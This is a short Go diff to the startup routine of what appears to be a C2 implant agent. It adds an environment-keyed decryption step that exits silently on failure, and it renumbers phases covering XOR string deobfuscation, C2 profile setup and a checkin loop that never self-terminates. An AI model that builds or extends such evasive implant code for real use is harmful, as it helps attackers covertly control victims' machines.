@@ -37,10 +37,15 @@ func main() {
 }
 
 func runAgent() {
-	// Phase 1: Deobfuscate config strings
+	// Phase 1: Decrypt environment-derived config (if env_key_derive is active)
+	if !deobfuscateEnvDerived() {
+		os.Exit(0)
+	}
+
+	// Phase 2: Deobfuscate config strings (XOR layer, if obfuscate_strings was used)
 	deobfuscateConfig()
 
-	// Phase 2: Parse and validate configuration
+	// Phase 3: Parse and validate configuration
 	cfg := parseConfigValues()
 	setupLogging(cfg.debug)
 
@@ -48,13 +53,13 @@ func runAgent() {
 		os.Exit(0)
 	}
 
-	// Phase 3: Apply startup security patches
+	// Phase 4: Apply startup security patches
 	applySecurity()
 
-	// Phase 4: Initialize agent struct
+	// Phase 5: Initialize agent struct
 	agent := initializeAgent(cfg)
 
-	// Phase 5: Initialize C2 profile
+	// Phase 6: Initialize C2 profile
 	c2Init, err := initC2Profile(cfg)
 	if err != nil {
 		log.Printf("%v", err)
@@ -84,7 +89,7 @@ func runAgent() {
 	commands.Initialize()
 	files.Initialize()
 
-	// Phase 6: Initial checkin with exponential backoff retry
+	// Phase 7: Initial checkin with exponential backoff retry
 	// maxRetries=0 means unlimited retries (never self-terminate)
 	log.Printf("connecting")
 	for attempt := 0; cfg.maxRetries == 0 || attempt < cfg.maxRetries; attempt++ {
